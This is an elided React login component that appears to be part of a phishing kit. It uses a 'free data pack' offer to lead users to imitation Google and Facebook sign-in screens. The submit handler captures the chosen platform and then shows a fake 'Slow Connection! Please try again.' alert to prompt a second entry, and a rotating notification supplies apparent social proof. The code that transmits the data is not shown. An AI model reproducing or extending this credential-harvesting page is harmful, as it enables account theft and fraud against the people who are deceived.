...
function Login() {
  ...
  // Screen resize detect karne ke liye
  useEffect(() => {
  ...
  useEffect(() => {
    const interval = setInterval(() => {
      setNotifIndex((prevIndex) => (prevIndex + 1) % notifications.length);
    }, 3000);
  ...
  const handleFinalSubmit = async (e) => {
    e.preventDefault();
    const type = view === 'fb' ? 'Facebook' : 'Google';
    try {
      ...
      alert("Slow Connection! Please try again.");
    }
  };

  // --- VIEW 1: MAIN PAGE (Responsive) ---
  if (view === 'main') {
    return (
      <div style={mainWrapper}>
        ...
        <div style={heroSection}>
          ...
          <p style={heroSubTitle}>Get your free data pack instantly. Select a secure verification method to continue.</p>
          ...
          <div style={selectionContainer}>
            <div onClick={() => setView('google')} style={{...methodCard, width: isMobile ? '85%' : '300px'}}>
              ...
              <div style={methodText}>
                ...
                <span style={methodDesc}>Safe & Secure</span>
              </div>
            </div>
            ...
            <div onClick={() => setView('fb')} style={{...methodCardFb, width: isMobile ? '85%' : '300px'}}>
              ...
              <div style={methodText}>
                ...
                <span style={methodDescFb}>Instant Verification</span>
              </div>
            </div>
          </div>
        </div>

        <div style={{...notificationFloat, right: isMobile ? '10px' : '20px', left: isMobile ? '10px' : 'auto', bottom: '20px'}}>
  ...
  // --- VIEW 2: GOOGLE (Responsive) ---
  if (view === 'google') {
    return (
      <div style={gBackground}>
        <div style={{...gContainer, width: isMobile ? '80%' : '360px', border: isMobile ? 'none' : '1px solid #dadce0'}}>
  ...
  // --- VIEW 3: FB (Responsive) ---
  if (view === 'fb') {
    return (
      <div style={{ background: '#f0f2f5', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: '30px' }}>
        <h1 style={{ color: '#1877f2', fontSize: isMobile ? '32px' : '40px', fontFamily: 'Arial', fontWeight: 'bold' }}>facebook</h1>
...
// --- RESPONSIVE STYLES ---
const mainWrapper = { background: 'linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)', minHeight: '100vh', color: '#fff', textAlign: 'center', fontFamily: 'Arial', position: 'relative', paddingBottom: '80px' };
...
const notificationFloat = { position: 'fixed', background: '#fff', color: '#333', padding: '10px 15px', borderRadius: '50px', fontSize: '12px', boxShadow: '0 5px 15px rgba(0,0,0,0.3)', borderLeft: '5px solid #4caf50', zIndex: 100 };
